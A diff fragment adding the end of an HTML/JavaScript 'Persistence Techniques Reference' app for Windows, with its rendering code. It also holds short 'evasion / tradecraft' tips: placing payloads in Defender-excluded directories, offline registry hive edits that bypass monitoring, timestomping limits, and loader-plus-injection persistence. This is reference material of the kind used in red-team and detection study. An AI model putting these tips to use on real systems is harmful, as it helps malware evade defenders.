+{t:"$FILE_NAME timestamp survives timestomping",d:"SetFileTime only modifies $STANDARD_INFORMATION in NTFS MFT. $FILE_NAME timestamp only modifiable via kernel. Forensic artifact."},
+{t:"Defender exclusions survive reboot",d:"Registry-based exclusion paths persist. Drop payloads in excluded directories. Tamper Protection may revert - test first."},
+{t:"Direct hive manipulation",d:"Parse and modify registry hive files (SYSTEM, SOFTWARE) offline. Bypasses all usermode registry monitoring. Requires raw file access."},
+{t:"Combine persistence + injection",d:"Best pattern: persistence mechanism drops/decrypts DLL, then uses process injection to run in memory. File on disk is just a loader."}
+]
+};
+function render(){
+var si=SE.findIndex(function(x){return x.id===S.s}),so=SE[si];
+var codes=getCodes(S.s),tricks=TR[S.s]||[];
+var flow='';
+if(S.s==='reg')flow=fREG();else if(S.s==='tsk')flow=fTSK();else if(S.s==='wmi')flow=fWMI();
+else if(S.s==='dll')flow=fDLL();else if(S.s==='boo')flow=fBOO();else if(S.s==='svc')flow=fSVC();
+else if(S.s==='adv')flow=fADV();else if(S.s==='kit')flow=fKIT();else if(S.s==='byp')flow=fBYP();
+
+var chtml=codes.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No code examples.</div>':
+codes.map(function(c,i){return'<div class="cp" data-ci="'+i+'"><button class="ct2"><span class="cv">&#9654;</span><span class="tl">'+c.t+'</span>'+T(c.l,"#6b7280",1)+'</button></div>'}).join('');
+
+var thtml=tricks.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No evasion tricks.</div>':
+'<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">EVASION / TRADECRAFT</div>'+
+tricks.map(function(t,i){return'<div class="ti" data-ti="'+i+'"><button class="tt"><span class="cv" style="color:#f97316;font-size:10px">&#9654;</span><span class="tn">'+t.t+'</span></button></div>'}).join('');
+
+var pv=si>0?'<button class="nb2" data-nv="'+SE[si-1].id+'">\u2190 '+SE[si-1].l+'</button>':'';
+var nx=si<SE.length-1?'<button class="nb2" data-nv="'+SE[si+1].id+'">'+SE[si+1].l+' \u2192</button>':'';
+
+$('#app').innerHTML=
+'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>Persistence Techniques Reference</h1><div class="sub">Registry \u2022 Tasks \u2022 WMI \u2022 DLL \u2022 Boot/Logon \u2022 Services \u2022 Advanced \u2022 Toolkit \u2022 Bypasses</div></div></div><div class="st">'+
+SE.map(function(s){return'<button class="sb'+(S.s===s.id?' on':'')+'" style="'+(S.s===s.id?'color:'+s.c+';border-bottom-color:'+s.c:'')+'" data-sc="'+s.id+'">'+s.i+' '+s.l+'</button>'}).join('')+
+'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F512} Evasion'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
+'<div class="ct"><div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><span style="font-size:1em">'+so.i+'</span><h2 style="font-size:.9em;font-weight:700">'+so.l+'</h2>'+T(so.l,so.c)+'<div style="margin-left:auto;display:flex;gap:3px">'+pv+nx+'</div></div>'+
+'<div id="tf" style="'+(S.t!=='flow'?'display:none':'')+'">'+flow+'</div>'+
+'<div id="tc" style="'+(S.t!=='code'?'display:none':'')+'">'+chtml+'</div>'+
+'<div id="tt" style="'+(S.t!=='tricks'?'display:none':'')+'">'+thtml+'</div></div>'+
+'<div class="ft">'+[{c:"#f87171",l:"Registry"},{c:"#60a5fa",l:"Tasks"},{c:"#a78bfa",l:"WMI"},{c:"#fbbf24",l:"DLL"},{c:"#34d399",l:"Boot/Logon"},{c:"#f59e0b",l:"Services"},{c:"#e879f9",l:"Advanced"},{c:"#f472b6",l:"Toolkit"},{c:"#fb923c",l:"Bypasses"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
+
+$$('[data-sc]').forEach(function(b){b.onclick=function(){S.s=b.dataset.sc;S.t='flow';render()}});
+$$('[data-tb]').forEach(function(b){b.onclick=function(){S.t=b.dataset.tb;render()}});
+$$('[data-nv]').forEach(function(b){b.onclick=function(){S.s=b.dataset.nv;S.t='flow';render()}});
+
+$$('.cp').forEach(function(p){
+p.querySelector('.ct2').onclick=function(){
+var ex=p.querySelector('.cb'),cv=p.querySelector('.cv');
+if(ex){ex.remove();cv.classList.remove('op');return}
+cv.classList.add('op');
+var ci=parseInt(p.dataset.ci),c=codes[ci];
+var pre=document.createElement('pre');pre.className='cb mono';
+pre.innerHTML=c.c.split('\n').map(function(line){
+var ci2=line.indexOf('//'),si2=-1;
+var cs=ci2>=0?ci2:-1;
+if(cs>=0)return esc(line.slice(0,cs))+'<span class="cm">'+esc(line.slice(cs))+'</span>';
+if(line.trimStart().charAt(0)==='#')return'<span class="pp">'+esc(line)+'</span>';
+return esc(line);
+}).join('\n');
+p.appendChild(pre);
+};
+});
+
+$$('.ti').forEach(function(p){
+p.querySelector('.tt').onclick=function(){
+var ex=p.querySelector('.td'),cv=p.querySelector('.cv');
+if(ex){ex.remove();p.classList.remove('op');cv.classList.remove('op');return}
+p.classList.add('op');cv.classList.add('op');
+var ti=parseInt(p.dataset.ti);
+var div=document.createElement('div');div.className='td';div.textContent=tricks[ti].d;
+p.appendChild(div);
+};
+});
+}
+render();
+</script>
+</body>
+</html>
